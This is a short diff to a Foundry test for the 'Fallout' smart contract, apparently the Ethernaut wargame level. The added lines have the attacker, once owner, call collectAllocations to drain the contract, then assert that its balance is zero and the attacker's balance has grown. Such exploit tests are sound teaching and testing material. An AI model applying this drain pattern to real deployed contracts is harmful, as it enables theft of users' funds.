@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import{Test} from "forge-std/Test.sol";
+import{Test,console} from "forge-std/Test.sol";
 
 import{Fallout} from "../src/Fallout.sol";
 
@@ -86,9 +86,23 @@ contract FalloutTest is Test {
         assertEq(falloutContact.owner() , attacker);
         assert(falloutContact.owner() != falloutOwner);
 
-        
+        // He can steal All Money from The Contract
 
 
+
+        vm.startPrank(attacker);
+        falloutContact.collectAllocations();
+        vm.stopPrank();
+
+        // now the contract balance should be 0
+
+        assertEq(address(falloutContact).balance ,0);
+
+        // attacker Should have more than his initial balance which was 1 ether
+
+        assert(attacker.balance > 1 ether);
+
+        console.log(attacker.balance);
 
     }   
 
